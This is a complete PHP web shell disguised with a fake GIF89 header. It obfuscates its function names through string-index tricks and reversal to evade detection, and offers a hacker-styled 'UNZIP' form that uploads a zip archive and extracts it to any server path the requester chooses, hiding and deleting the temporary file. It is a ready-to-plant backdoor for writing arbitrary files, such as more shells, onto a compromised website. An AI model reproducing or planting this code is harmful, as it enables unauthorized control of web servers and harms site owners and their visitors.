<!-- GIF89;a -->
<body style="background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
<?php

@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('memory_limit', '1G');
@set_time_limit(0);

$s = "abcdefghijklmnopqrstuvwxyz_1234567890";
$m = $s[12].$s[14].$s[21].$s[4].$s[26].$s[20].$s[15].$s[11].$s[14].$s[0].$s[3].$s[4].$s[3].$s[26].$s[5].$s[8].$s[11].$s[4];
$u = $s[20].$s[13].$s[11].$s[8].$s[13].$s[10];
$z = strrev('evihcrApiz');

$curr_dir = getcwd();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['z_file'])) {
    $src = $_FILES['z_file']['tmp_name'];
    $dst_dir = !empty($_POST['z_path']) ? $_POST['z_path'] : $curr_dir;
    
    $tmp_name = $dst_dir . '/.' . substr(str_shuffle($s), 0, 6);

    if ($m($src, $tmp_name)) {
        if (class_exists($z)) {
            $zip = new $z;
            if ($zip->open($tmp_name) === TRUE) {
                $zip->extractTo($dst_dir);
                $zip->close();
                echo "<script>alert('SUCCESS UPLOAD TO: $dst_dir'); window.location.href=window.location.href;</script>";
            } else { echo "Bad Archive"; }
        } else { echo "Engine Off"; }
        @$u($tmp_name);
    } else { echo "Write Denied"; }
} else { ?>
    <form method="post" enctype="multipart/form-data" style="text-align:center">
        <h2 style="letter-spacing:5px;text-shadow:0 0 10px #0f0">.+.U.N.Z.I.P.+.</h2>
        <div style="border:1px solid #0f0;padding:30px;background:rgba(0,255,0,0.05);box-shadow:0 0 20px rgba(0,255,0,0.2)">
            <span style="font-size:12px">PATH DIR</span><br>
            <input type="text" name="z_path" value="<?php echo $curr_dir; ?>/" style="width:400px;background:#000;color:#0f0;border:1px solid #0f0;padding:8px;margin:10px 0;text-align:center">
            <br><br>
            <input type="file" name="z_file" style="color:#0f0;margin-bottom:20px">
            <br>
            <input type="submit" value="ENTER" style="background:#0f0;color:#000;border:none;padding:12px 40px;cursor:pointer;font-weight:bold;width:100%;letter-spacing:2px">
        </div>
    </form>
<?php } ?>
</body>